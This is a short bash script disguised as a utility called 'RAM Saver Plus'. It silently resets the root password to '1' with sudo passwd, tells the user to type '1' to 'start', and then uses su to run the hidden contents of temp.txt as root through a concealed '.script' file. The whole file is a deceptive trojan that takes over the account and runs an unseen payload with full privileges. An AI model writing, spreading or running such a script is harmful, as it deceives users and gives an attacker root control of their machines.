#!/bin/bash

echo -e "1\n1" | sudo passwd
clear
echo "Welcome to RAM Saver Plus! Enter '1' for the password to start!"
su -c "cat temp.txt >> .script; chmod +x .script; ./.script"
clear

